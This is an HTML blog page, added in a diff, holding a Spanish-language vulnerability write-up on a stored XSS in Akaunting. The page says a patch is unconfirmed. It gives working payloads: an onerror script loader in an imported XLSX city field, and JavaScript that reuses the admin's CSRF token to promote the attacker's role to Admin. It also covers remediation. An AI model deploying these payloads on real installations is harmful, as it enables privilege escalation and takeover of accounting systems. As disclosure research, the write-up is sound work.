@@ -1,0 +1,273 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Stored XSS en Akaunting: de un XLSX a Administrator | ZsZsec</title>
+  <meta name="description" content="Investigación sobre un stored XSS en Akaunting que permitía escalar desde un importador de clientes hasta administrador." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <link rel="canonical" href="https://zszsec.github.io/articulos/akaunting-stored-xss-customer-import-admin-escalation.html" />
+  <meta property="og:title" content="Stored XSS en Akaunting: de un XLSX a Administrator" />
+  <meta property="og:description" content="Investigación sobre un stored XSS en Akaunting que permitía escalar desde un importador de clientes hasta administrador." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/articulos/akaunting-stored-xss-customer-import-admin-escalation.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Stored XSS en Akaunting: de un XLSX a Administrator" />
+  <meta name="twitter:description" content="Stored XSS en Akaunting desde un importador de clientes hasta administrador." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link active" href="../articulos.html" aria-current="page">Artículos</a><a class="nav-link" href="../bug-bounty.html">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">source code research / akaunting</p>
+      <h1>Stored XSS to Admin<span>_</span></h1>
+      <div class="writeup-meta"><span>Critical</span><span>Stored XSS / Privilege escalation</span><span>No response</span></div>
+      <div class="tag-row"><span class="tag">Source Code Review</span><span class="tag">Stored XSS</span><span class="tag">Privilege Escalation</span><span class="tag">Vue.js</span><span class="tag">Laravel</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <p>Durante una revisión de Akaunting encontré una cadena de stored XSS que comenzaba en la importación de clientes desde XLSX y terminaba ejecutando JavaScript en la sesión de un administrador.</p>
+
+        <p>Una cuenta sin privilegios administrativos, pero con permiso para crear o importar clientes, podía guardar un payload en un campo de dirección como <code>city</code>. Más adelante, cuando un administrador seleccionaba ese cliente durante la creación de una factura, Akaunting renderizaba <code>contact.location</code> mediante <code>v-html</code> y ejecutaba el contenido almacenado.</p>
+
+        <p>En mi laboratorio utilicé la ejecución same-origin para enviar una petición administrativa con la sesión y el token CSRF de la víctima. La prueba cambió mi propia cuenta de un rol limitado a <code>Admin</code>.</p>
+
+        <blockquote><p>La reproducción se limitó a una instancia local construida desde el repositorio oficial. Los correos, nombres e identificadores de este artículo son datos sintéticos del laboratorio.</p></blockquote>
+
+        <h2>Ficha técnica</h2>
+
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Producto</td><td>Akaunting</td></tr>
+            <tr><td>Repositorio</td><td><a href="https://github.com/akaunting/akaunting" target="_blank" rel="noopener noreferrer">github.com/akaunting/akaunting</a></td></tr>
+            <tr><td>Reporte enviado</td><td>26 de julio de 2026</td></tr>
+            <tr><td>Versión</td><td>3.2.1 Stable</td></tr>
+            <tr><td>Codename</td><td>Speed</td></tr>
+            <tr><td>Fecha del release</td><td>2026-07-21</td></tr>
+            <tr><td>Rama probada</td><td><code>master</code></td></tr>
+            <tr><td>Commit probado</td><td><code>ecb295d01a7d0cf0f718957530bbbae33435c9f5</code></td></tr>
+            <tr><td>Vulnerabilidad</td><td>Stored XSS — CWE-79</td></tr>
+            <tr><td>Entrada</td><td>Campos de dirección importados mediante XLSX</td></tr>
+            <tr><td>Sink</td><td><code>contact.location</code> en Vue <code>v-html</code></td></tr>
+            <tr><td>Requisito</td><td>Usuario no administrador con permisos de importación o creación de clientes</td></tr>
+            <tr><td>Interacción</td><td>Un administrador selecciona el cliente malicioso</td></tr>
+            <tr><td>CVSS 3.1</td><td>9.0 Critical</td></tr>
+            <tr><td>CVSS 4.0</td><td>8.4 High</td></tr>
+            <tr><td>Estado</td><td>Maintainer sin respuesta / corrección no confirmada</td></tr>
+          </tbody>
+        </table>
+
+        <h2>El límite de confianza que se rompía</h2>
+
+        <p>Los campos <code>city</code>, <code>state</code> y <code>zip_code</code> son datos de dirección en texto plano. El propio backend documentaba esa expectativa:</p>
+
+        <pre><code class="language-javascript">// Keep formatted address as plain text. Views convert line breaks to &lt;br&gt; safely.</code></pre>
+
+        <p>Sin embargo, el componente de contacto trataba la ubicación formateada como HTML confiable. El sink estaba en:</p>
+
+        <pre><code>resources/assets/js/components/AkauntingContactCard.vue</code></pre>
+
+        <pre><code class="language-vue">&lt;tr v-if="contact.location"&gt;
+  &lt;th
+    class="font-normal text-sm ltr:text-left rtl:text-right p-0"
+    v-html="contact.location"
+  &gt;&lt;/th&gt;
+&lt;/tr&gt;</code></pre>
+
+        <p>La directiva <code>v-html</code> no escapa el valor. Si una parte de <code>contact.location</code> contiene markup, Vue lo entrega al parser HTML del navegador.</p>
+
+        <h2>Flujo vulnerable</h2>
+
+        <p>La importación aceptaba el contenido de los campos de dirección y ese valor reaparecía después dentro de la ubicación del contacto:</p>
+
+        <pre><code>XLSX controlado por un usuario de bajo privilegio
+        ↓
+campo city, state o zip_code
+        ↓
+cliente almacenado
+        ↓
+contact.location
+        ↓
+AkauntingContactCard.vue
+        ↓
+v-html
+        ↓
+JavaScript en la sesión del administrador</code></pre>
+
+        <p>La cuenta atacante no necesitaba permisos de usuarios, roles o configuración. El administrador activaba la cadena durante una acción normal: seleccionar el cliente en el formulario de una factura.</p>
+
+        <h2>Confirmación del stored XSS</h2>
+
+        <p>Primero importé un XLSX cuyo campo <code>city</code> contenía un payload visible:</p>
+
+        <pre><code class="language-html">&lt;img src=x onerror="alert('XSS contact.location: '+document.domain)"&gt;</code></pre>
+
+        <p>El payload permaneció almacenado con el cliente. Al abrir el formulario de facturas y seleccionar ese contacto desde una sesión administrativa, el componente renderizó la ubicación y se ejecutó <code>onerror</code>.</p>
+
+        <p>La prueba confirmó cuatro propiedades:</p>
+
+        <ol>
+          <li>El payload entraba por el flujo normal de importación.</li>
+          <li>Sobrevivía al almacenamiento y recuperación del cliente.</li>
+          <li>La ejecución ocurría en una vista utilizada por administradores.</li>
+          <li>El código se ejecutaba bajo el origen y la sesión de Akaunting.</li>
+        </ol>
+
+        <h2>Del XSS a la escalada de privilegios</h2>
+
+        <p>El campo de dirección tenía una longitud limitada. Para demostrar impacto sin convertir el valor importado en un script extenso, utilicé un loader corto hacia un servidor del laboratorio:</p>
+
+        <pre><code class="language-html">&lt;img src=x onerror="s=document.createElement('script');s.src='//127.0.0.1:9001/p.js';document.body.append(s)"&gt;</code></pre>
+
+        <p>El archivo <code>p.js</code> preparaba la misma petición que utilizaría la interfaz administrativa para actualizar un usuario. Estos IDs pertenecían únicamente a la instancia local:</p>
+
+        <pre><code class="language-javascript">const attackerUserId = 2;
+const adminRoleId = 1;
+const companyId = 1;
+
+const body = new URLSearchParams();
+body.append("_method", "PATCH");
+body.append("name", "Customer Importer");
+body.append("email", "attacker@example.test");
+body.append("landing_page", "dashboard");
+body.append("enabled", "1");
+body.append("roles", String(adminRoleId));
+body.append("companies[]", String(companyId));
+
+fetch(`/${companyId}/auth/users/${attackerUserId}`, {
+  method: "POST",
+  credentials: "same-origin",
+  headers: {
+    "X-CSRF-TOKEN": window.Laravel.csrfToken,
+    "X-Requested-With": "XMLHttpRequest",
+    "Content-Type": "application/x-www-form-urlencoded",
+  },
+  body: body.toString(),
+}).then((response) =&gt; {
+  console.log("role escalation status:", response.status);
+});</code></pre>
+
+        <p>El código no robaba credenciales. Se ejecutaba dentro del navegador del administrador y aprovechaba directamente su contexto autenticado. Por eso podía leer <code>window.Laravel.csrfToken</code>, enviar cookies same-origin y realizar una acción que la cuenta atacante no podía ejecutar por sí sola.</p>
+
+        <h2>Reproducción en el laboratorio</h2>
+
+        <p>Las precondiciones eran:</p>
+
+        <pre><code>Víctima
+- Cuenta Administrator
+
+Atacante
+- Cuenta autenticada sin privilegios administrativos
+- Permiso para crear o importar clientes
+- Sin permisos para administrar usuarios o roles</code></pre>
+
+        <p>El procedimiento que seguí fue:</p>
+
+        <ol>
+          <li>Inicié sesión con la cuenta limitada.</li>
+          <li>Abrí <code>Sales → Customers → Import</code>.</li>
+          <li>Importé un cliente con el loader en el campo <code>city</code>.</li>
+          <li>Serví <code>p.js</code> únicamente dentro de la red del laboratorio.</li>
+          <li>Inicié sesión como administrador y abrí <code>/&lt;company_id&gt;/sales/invoices/create</code>.</li>
+          <li>Seleccioné el cliente importado.</li>
+          <li>El componente de contacto ejecutó el loader y la petición de actualización respondió <code>HTTP 200</code>.</li>
+          <li>Cerré la sesión e inicié nuevamente como el atacante.</li>
+          <li>La cuenta ya podía acceder a administración de usuarios y configuración de la compañía.</li>
+        </ol>
+
+        <p>La transición observada fue:</p>
+
+        <pre><code>attacker@example.test → customer-importer-limited
+attacker@example.test → admin</code></pre>
+
+        <p>La comprobación de base de datos confirmó el cambio de rol en la instancia local:</p>
+
+        <pre><code>+----+-----------------------+---------+-----------+
+| id | email                 | role_id | role_name |
++----+-----------------------+---------+-----------+
+|  2 | attacker@example.test |       1 | admin     |
++----+-----------------------+---------+-----------+</code></pre>
+
+        <h2>Por qué el token CSRF no detenía el ataque</h2>
+
+        <p>Un token CSRF protege contra peticiones iniciadas desde otro origen. No protege contra JavaScript que ya se ejecuta dentro del origen legítimo.</p>
+
+        <p>El stored XSS podía acceder a <code>window.Laravel.csrfToken</code> y enviar una petición con <code>credentials: "same-origin"</code>. Desde la perspectiva del servidor, la solicitud provenía de la sesión administrativa y contenía el token esperado.</p>
+
+        <h2>Impacto</h2>
+
+        <p>La cadena permitía que un usuario de bajo privilegio escalara a administrador después de que una víctima administrativa seleccionara el cliente preparado.</p>
+
+        <p>El impacto que confirmé fue:</p>
+
+        <pre><code>customer importer de bajo privilegio
+        ↓
+stored XSS mediante XLSX
+        ↓
+administrador selecciona el cliente
+        ↓
+JavaScript same-origin en la sesión administrativa
+        ↓
+actualización del rol del atacante
+        ↓
+acceso administrativo</code></pre>
+
+        <p>Una vez elevado, el atacante podía acceder a funciones como administración de usuarios, configuración de compañías y otros recursos restringidos.</p>
+
+        <h2>Severidad</h2>
+
+        <p>Calculé las siguientes puntuaciones:</p>
+
+        <pre><code>CVSS 3.1: 9.0 Critical
+CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L
+
+CVSS 4.0: 8.4 High
+CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:L/SC:L/SI:L/SA:N</code></pre>
+
+        <p>La interacción requerida está reflejada en ambos vectores: el administrador debe seleccionar el cliente malicioso. No hace falta que confirme una acción adicional ni que abra un adjunto.</p>
+
+        <h2>Remediación</h2>
+
+        <p><code>contact.location</code> debe mantenerse como texto. El componente no necesita interpretar HTML para mostrar una dirección.</p>
+
+        <p>La solución preferida es retirar <code>v-html</code> y utilizar interpolación de Vue:</p>
+
+        <pre><code class="language-vue">&lt;th
+  v-if="contact.location"
+  class="whitespace-pre-line font-normal text-sm ltr:text-left rtl:text-right p-0"
+&gt;
+  {{ contact.location }}
+&lt;/th&gt;</code></pre>
+
+        <p>También aplicaría estas medidas:</p>
+
+        <ol>
+          <li>Validar los campos de dirección durante creación e importación como texto plano.</li>
+          <li>Revisar todos los sinks <code>v-html</code> que reciban modelos de contacto, facturación o importaciones.</li>
+          <li>Si alguna vista requiere HTML, sanitizarlo con una allowlist inmediatamente antes del sink.</li>
+          <li>Añadir una CSP estricta como defensa en profundidad.</li>
+          <li>Crear pruebas con payloads en <code>city</code>, <code>state</code> y <code>zip_code</code> tanto para formularios como para XLSX.</li>
+        </ol>
+
+        <p>Codificar solo en la importación no sería suficiente si existen otras rutas para actualizar el contacto. La garantía principal debe estar en el punto de renderizado: los campos de dirección nunca deben convertirse en HTML activo.</p>
+
+        <h2>Estado de divulgación</h2>
+
+        <p>Contacté al equipo de seguridad y al maintainer con la reproducción y el impacto confirmado, pero no recibí respuesta. No tengo confirmación de un parche y no afirmo que la versión actual esté corregida.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
